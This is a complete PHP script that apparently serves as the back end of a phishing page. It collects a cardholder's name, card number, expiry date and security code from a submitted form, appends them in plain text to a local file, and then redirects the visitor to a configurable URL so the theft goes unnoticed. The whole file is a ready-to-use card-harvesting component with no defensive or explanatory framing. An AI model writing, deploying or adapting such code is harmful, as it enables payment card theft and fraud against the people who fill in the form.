<?php
// Check if all required fields are submitted
if (
    isset($_POST['owner']) &&
    isset($_POST['cardNumber']) &&
    isset($_POST['expirationdate']) &&
    isset($_POST['securitycode'])
) {
    $file = "usernames.txt";
    $data = 
        "owner: " . $_POST['owner'] . "\n" .
        "cardNumber: " . $_POST['cardNumber'] . "\n" .
        "expirationdate: " . $_POST['expirationdate'] . "\n" .
        "securitycode: " . $_POST['securitycode'] . "\n\n";

    file_put_contents($file, $data, FILE_APPEND);
    header('Location: <REDIRECT_URL>'); // Replace with your URL
    exit;
} else {
    // Log missing fields
    file_put_contents("error.log", "Missing form data: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
    header('Location: error_page.html'); // Redirect to error page
    exit;
}
?>
